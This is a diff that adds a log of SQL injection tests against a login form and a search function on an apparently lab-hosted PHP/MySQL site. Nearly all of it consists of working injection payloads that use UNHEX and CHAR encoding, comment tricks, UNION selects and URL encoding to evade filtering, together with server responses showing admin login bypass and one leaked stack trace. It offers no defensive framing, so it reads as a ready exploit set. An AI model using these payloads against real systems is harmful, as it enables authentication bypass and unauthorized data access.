@@ -1,0 +1,71 @@
+
+1. USING MYSQL UNHEX() FUNCTION WITH PROPER COMMENTS
+====================================================
+
+Test 1.1: UNHEX with -- comment (with space)
+Payload: admin' OR UNHEX('61646d696e')=username-- 
+Explanation: UNHEX('61646d696e') decodes to 'admin'
+Result: <h1>Login Successful!</h1><p>Welcome, admin</p><p>Email: admin@example.com</p><p>SQL Query: SELECT * FROM users WHERE username = 'admin' OR UNHEX('61646d696e')=username-- ' AND password = 'test'</p><a href='/'>Back to Home</a>Status: 200
+
+Test 1.2: UNHEX with # comment
+Payload: admin' OR UNHEX('61646d696e')=username#
+Explanation: Using # for comment (no space needed)
+Result: <h1>Login Successful!</h1><p>Welcome, admin</p><p>Email: admin@example.com</p><p>SQL Query: SELECT * FROM users WHERE username = 'admin' OR UNHEX('61646d696e')=username#' AND password = 'test'</p><a href='/'>Back to Home</a>Status: 200
+
+2. USING MYSQL CHAR() FUNCTION WITH PROPER COMMENTS
+===================================================
+
+Test 2.1: CHAR with -- comment
+Payload: ' OR CHAR(97,100,109,105,110)=username-- 
+Explanation: CHAR(97,100,109,105,110) = 'admin'
+Result: <h1>Login Successful!</h1><p>Welcome, admin</p><p>Email: admin@example.com</p><p>SQL Query: SELECT * FROM users WHERE username = '' OR CHAR(97,100,109,105,110)=username-- ' AND password = 'test'</p><a href='/'>Back to Home</a>Status: 200
+
+Test 2.2: CHAR with UNION and # comment
+Payload: ' OR 1=1 UNION SELECT CHAR(117,115,101,114,115),2#
+Explanation: CHAR(117,115,101,114,115) = 'users'
+Result: <br />
+<b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns in /var/www/html/login.php:10
+Stack trace:
+#0 /var/www/html/login.php(10): PDO-&gt;query('SELECT * FROM u...')
+#1 {main}
+  thrown in <b>/var/www/html/login.php</b> on line <b>10</b><br />
+Status: 200
+
+3. ALTERNATIVE HEX BYPASS WITHOUT COMMENTS
+==========================================
+
+Test 3.1: Using OR condition without comments
+Payload: admin' OR UNHEX('61646d696e')=username OR '1'='1
+Explanation: No comments needed, just additional true condition
+Result: <h1>Login Successful!</h1><p>Welcome, admin</p><p>Email: admin@example.com</p><p>SQL Query: SELECT * FROM users WHERE username = 'admin' OR UNHEX('61646d696e')=username OR '1'='1' AND password = 'test'</p><a href='/'>Back to Home</a>Status: 200
+
+Test 3.2: Simple hex comparison
+Payload: ' OR UNHEX('31')=UNHEX('31') OR '1'='1
+Explanation: UNHEX('31') = '1', comparing 1=1
+Result: <h1>Login Successful!</h1><p>Welcome, admin</p><p>Email: admin@example.com</p><p>SQL Query: SELECT * FROM users WHERE username = '' OR UNHEX('31')=UNHEX('31') OR '1'='1' AND password = 'test'</p><a href='/'>Back to Home</a>Status: 200
+
+4. SEARCH FUNCTION BYPASS WITH PROPER SYNTAX
+============================================
+
+Test 4.1: Search with UNHEX and comment
+Payload: test' UNION SELECT UNHEX('7761665F74657374'),2-- 
+Explanation: UNHEX('7761665F74657374') = 'waf_test'
+Result: Status: 000
+
+Test 4.2: Search with CHAR and comment
+Payload: ' UNION SELECT CHAR(64,64,118,101,114,115,105,111,110),2-- 
+Explanation: CHAR(64,64,118,101,114,115,105,111,110) = '@@version'
+Result: Status: 000
+
+5. URL ENCODED HEX BYPASS
+=========================
+
+Test 5.1: URL encoded hex payload
+Original: admin' OR UNHEX('61646d696e')=username-- 
+URL Encoded: admin%27%20OR%20UNHEX%28%2761646d696e%27%29%3Dusername--%20
+Result: <h1>Login Successful!</h1><p>Welcome, admin</p><p>Email: admin@example.com</p><p>SQL Query: SELECT * FROM users WHERE username = 'admin' OR UNHEX('61646d696e')=username-- ' AND password = 'test'</p><a href='/'>Back to Home</a>Status: 200
+
+Test 5.2: Mixed encoding with URL encode
+Payload: ' OR CHAR(97,100,109,105,110)=username-- 
+URL Encoded: %27%20OR%20CHAR%2897%2C100%2C109%2C105%2C110%29%3Dusername--%20
+Result: <h1>Login Successful!</h1><p>Welcome, admin</p><p>Email: admin@example.com</p><p>SQL Query: SELECT * FROM users WHERE username = '' OR CHAR(97,100,109,105,110)=username-- ' AND password = 'test'</p><a href='/'>Back to Home</a>Status: 200
